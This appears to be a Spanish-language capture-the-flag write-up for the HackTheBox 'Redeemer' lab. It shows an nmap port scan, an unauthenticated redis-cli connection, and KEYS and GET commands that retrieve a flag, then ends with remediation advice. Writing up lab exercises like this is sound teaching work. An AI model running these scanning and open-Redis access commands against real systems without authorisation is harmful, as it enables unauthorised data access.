🛡️ Informe de Intrusión: Máquina Redeemer (HTB)

Fecha: 4 de Abril, 2026

Objetivo: 10.129.60.228

Severidad: Crítica (Acceso no autorizado a Base de Datos)
1. Fase de Reconocimiento (Reconnaissance)

Para identificar los servicios activos, se realizó un escaneo completo de puertos TCP utilizando nmap:
Bash

nmap -p- --min-rate 5000 -sV 10.129.60.228

    Puerto Detectado: 6379/tcp

    Servicio: Redis

    Versión: 5.0.7

2. Fase de Enumeración (Enumeration)

Al detectar Redis, se procedió a verificar si el servicio permitía conexiones sin autenticación utilizando la herramienta redis-cli.

    Conexión inicial: redis-cli -h 10.129.60.228 (Conexión exitosa sin contraseña).

    Inspección del servidor: El comando info reveló que la base de datos db0 contenía 4 llaves.

    Listado de datos: El comando KEYS * mostró los nombres de las llaves almacenadas:

        temp

        numb

        flag 🚩

        stor

3. Explotación y Obtención de la Flag

Se utilizó el comando GET para extraer el valor de la llave identificada como crítica:
Bash

10.129.60.228:6379> GET flag

4. Análisis de Riesgos y Mitigación
⚠️ Hallazgo

El servidor Redis estaba configurado para escuchar en una interfaz de red pública y permitía el acceso total sin requerir una contraseña (comando AUTH).
✅ Recomendaciones (Remediación)

    Autenticación: Configurar una contraseña robusta en el archivo redis.conf usando la directiva requirepass.

    Bind Interface: Cambiar la configuración para que Redis solo escuche en 127.0.0.1 (localhost) si no es estrictamente necesario el acceso remoto.

    Firewall: Bloquear el puerto 6379 a cualquier IP que no sea de confianza.
